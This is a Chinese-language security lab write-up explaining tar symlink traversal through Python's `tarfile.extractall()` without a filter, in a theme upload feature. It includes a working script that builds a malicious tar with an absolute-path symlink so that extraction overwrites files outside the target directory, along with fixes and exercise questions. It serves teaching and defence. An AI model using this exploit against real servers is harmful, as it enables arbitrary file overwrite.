# 主题包解压处的 tar 符号链接穿越

## 这一题在教什么

**「我用的是标准库，所以应该没问题」这种想法，在压缩包这件事上不成立。**

这一题跟 `upload/zip_slip` 是一对，**而且结论正好相反**：

| | zip | tar |
|---|---|---|
| 标准库默认安全吗 | **安全** —— `zipfile` 从 Python 3.6 起会清理 `..` 和绝对路径 | **不安全** —— `tarfile` 到 3.13 都默认不过滤 |
| 洞一般出现在哪 | 开发者**手写循环**的时候 | 直接用 `extractall()` 就会中 |
| 修法 | 别自己写循环 / 用 `extractall()` | **加 `filter="data"`** |

也就是说：同一件"解压别人的压缩包"的事，两种格式的默认值**不一样**。

> 每换一个格式、每升一个版本，都要重新确认一遍默认行为。
> 靠"我记得标准库是安全的"来过日子，迟早会踩到。

## 漏洞在哪

`module.py`：

```python
archive.extractall(theme_dir)
#                    ↑ 没传 filter=
```

就这一行。**没有手写循环，没有拼路径，没有任何一行代码"看上去有问题"。**

问题在于这个调用在当前 Python 版本上的默认行为。实测（Python 3.13.12）：

| 调用方式 | 越界写成功 | 说明 |
|---|---|---|
| `extractall(dest)` | **成功** | 还会抛一条 `DeprecationWarning` |
| `extractall(dest, filter="fully_trusted")` | 成功 | 等于没加 |
| `extractall(dest, filter="tar")` | 被挡 | `OutsideDestinationError` |
| `extractall(dest, filter="data")` | 被挡 | `AbsoluteLinkError` |

那条警告的原文是：

```
DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives
and reject files or modify their metadata. Use the filter argument to control
this behavior.
```

**「3.14 会改」意味着「3.13 之前都不安全」。** 这类"默认值即将变安全"的窗口期，
是最容易出问题的时候 —— 你既不能等，也容易忽略那条警告。

顺带说：`shutil.unpack_archive(filename, extract_dir, filter=None)` 的
`filter` 参数**默认也是 None**，走的是同一条不安全的路。

## 关键：tar 成员不只有「普通文件」

tar 格式里每个成员都有一个 `type`：

| 类型 | 含义 |
|---|---|
| `REGTYPE` | 普通文件 |
| `DIRTYPE` | 目录 |
| **`SYMTYPE`** | **符号链接**（有一个 `linkname` 字段，可以是**绝对路径**） |
| `LNKTYPE` | 硬链接 |
| `CHRTYPE` / `BLKTYPE` | 设备文件 |

`extractall()` 会**照做**：先建符号链接，然后遇到"路径穿过这个链接"的成员时，
跟着链接把文件写到外面去。

## 怎么打通

### 第一步：先传一个正常主题包，确认功能

```bash
mkdir -p mytheme && echo 'body { margin: 0 }' > mytheme/style.css
tar -cf theme.tar mytheme
curl -F 'package=@theme.tar;type=application/x-tar' '<上传地址>'
```

### 第二步：造一个带符号链接的包

先放一个指向外部目录的链接，**再**放一个穿过它的普通文件：

```python
import io, tarfile

with tarfile.open("evil.tar", "w") as tf:
    # 一、先建一个指向外部的符号链接
    link = tarfile.TarInfo("escape")
    link.type = tarfile.SYMTYPE                      # 关键：类型是符号链接
    link.linkname = "<受保护目录的绝对路径>"          # 页面给了这个路径
    tf.addfile(link)

    # 二、再放一个"路径穿过那个链接"的普通文件
    data = b"theme dir escaped\n"
    member = tarfile.TarInfo("escape/notice.txt")
    member.size = len(data)
    tf.addfile(member, io.BytesIO(data))
```

### 第三步：传上去

`extractall()` 会：

1. 把 `escape` 建成一个指向受保护目录的符号链接
2. 写 `escape/notice.txt` 时**跟着链接**走到了外面
3. 于是受保护的那份文件被覆盖了

**顺序很重要**：链接必须在前，穿过它的文件在后。tar 是按顺序解压的。

### 换成硬链接可以吗

可以，道理一样 —— `LNKTYPE` 的 `linkname` 同样可以是绝对路径。
`filter="tar"` 对这两种都拦得住（`tar` 过滤器允许一部分链接，但会检查
最终落点是否在目标目录内）。

## 怎么修

**一、加一个参数就够了。**

```python
archive.extractall(theme_dir, filter="data")
```

`data` 是**最严的过滤器**（PEP 706 定义的三个过滤器里）：

| 过滤器 | 行为 |
|---|---|
| `fully_trusted` | 完全信任归档（旧的默认行为） |
| `tar` | 尊重大部分 tar 特性，但拒绝会落到目标目录外的成员 |
| `data` | **最严**：拒绝绝对路径、拒绝 `..`、拒绝链接到目标目录外、清理权限位等 |

**二、显式指定，不要等默认值改。**

即使到了 3.14 默认变成 `data`，也建议显式写出来 ——
因为读代码的人需要看到"这里做了这个决定"。（这一条跟"别依赖框架的默认安全值"
是同一个道理。）

**三、解压之前先检查成员。**

如果你要自己控制策略（比如"只允许图片"），就遍历一遍成员再决定：

```python
for member in archive.getmembers():
    if member.issym() or member.islnk():
        reject("主题包里不允许链接")
    if os.path.isabs(member.name) or ".." in member.name.split("/"):
        reject("非法路径")
```

**但注意**：这是黑名单式的，容易漏（还有设备文件、`..` 的各种编码、
大小写文件系统上的问题……）。**`filter="data"` 才是修复，自己检查是补充。**

**四、跑在低权限用户下、限制写范围。**

纵深防御：即使解压越界了，那个进程也只该能写它自己的数据目录。
容器 / 独立用户 / 只挂载必要目录 —— 这些能让"越界"从"任意文件写"降级成"写不动"。

**五、防压缩炸弹。**

这一题加了三个上限（包大小、总解压量、成员数）。tar 的炸弹比 zip 更容易做：
**一个成员只要在头里声明一个超大 `size`，解压时就会一直要空间。**

## 顺手想想

- `filter="tar"` 和 `filter="data"` 的区别是什么？各适合什么场景？
  （提示：一个是"尊重 tar 的语义但防止越界"，一个是"只把归档当成一堆数据"）
- 如果服务端加了"不允许符号链接成员"的检查，这一题还有别的路吗？
  （提示：硬链接、设备文件、以及 `..` 拼出来的路径）
- 为什么 zip 和 tar 的默认值会不一样？有没有什么历史原因？
- 如果这个 Python 版本已经是 3.14 了（默认 `filter="data"`），
  这一题还成立吗？（想清楚：题目的洞是"代码写错了"还是"默认值变了"）
